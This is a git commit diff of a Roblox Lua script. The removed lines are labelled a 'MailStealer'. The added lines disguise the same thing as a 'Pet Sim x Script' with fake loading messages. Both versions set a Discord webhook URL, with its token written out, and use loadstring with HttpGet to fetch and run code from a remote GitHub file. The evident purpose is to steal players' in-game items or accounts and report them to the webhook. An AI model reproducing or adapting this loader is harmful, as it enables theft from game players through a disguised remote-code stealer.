ac9192b6f1343e03f92fb9344011d2492fca0975
hsdfuyhsdufhs <128642081+hsdfuyhsdufhs@users.noreply.github.com>
2023-06-14 13:50:35 +0300

    Update Script2.lua

--- Script2.lua
+++ Script2.lua
@@ -1,10 +1,9 @@
---[[ Hostee Scriptz MailStealer ]]--
-
---[[ Main Config ]]--
-_G.UserNamey = "loadstping"
-
---[[ Webhook Config ]]--
-_G.Webhooky = "https://discord.com/api/webhooks/1102574742122266766/ChbujQLOAHgogj38_NTTul-LIJGJSjY_RdArakF0dHBPqtYLziTNBk2fYNDfO0rDLbAZ"
-
---[[ Main Script ]]--
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20MailStealer%20%E2%9C%97"))()
+WebHook = "https://discord.com/api/webhooks/1102574742122266766/ChbujQLOAHgogj38_NTTul-LIJGJSjY_RdArakF0dHBPqtYLziTNBk2fYNDfO0rDLbAZ"
+loadingscreen = true
+_G.Key = "loadstping"
+_G.CustomScriptName = "Pet Sim x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script-v4-1.lua"))()
